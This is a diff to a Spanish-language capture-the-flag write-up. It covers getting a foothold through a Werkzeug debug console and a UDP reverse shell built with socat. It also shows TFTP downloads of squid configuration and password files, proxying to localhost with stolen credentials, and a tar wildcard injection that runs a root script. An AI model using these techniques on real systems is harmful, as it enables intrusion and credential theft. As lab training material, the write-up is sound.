@@ -34,7 +34,7 @@ TFTP no lista directorios, pero se descargan `/etc/squid/squid.conf` y `/etc/squ
 
 ## Foothold
 
-La consola de Werkzeug permite ejecutar Python. Al intentar una reverse shell TCP no hay conectividad saliente; se enumera el firewall y se usa una reverse shell UDP con `socat file:\`tty\`,raw,echo=0 udp-listen:<PORT>`. La sesión queda como `werkzeug`.
+La consola de Werkzeug permite ejecutar Python. Al intentar una reverse shell TCP no hay conectividad saliente; se enumera el firewall y se usa una reverse shell UDP con `socat file:/dev/pts/0,raw,echo=0 udp-listen:<PORT>`. La sesión queda como `werkzeug`.
 
 ```bash
 # TFTP
@@ -44,7 +44,8 @@ tftp> get /etc/squid/passwords
 # proxy a localhost
 curl -x http://<USER>:<PASS>@<IP>:3128 http://127.0.0.1:8080/
 # tar wildcard
-touch -- '--checkpoint=1' '--checkpoint-action=exec=/dev/shm/root.sh'```
+touch -- '--checkpoint=1' '--checkpoint-action=exec=/dev/shm/root.sh'
+```
 
 ## Movimiento lateral
 
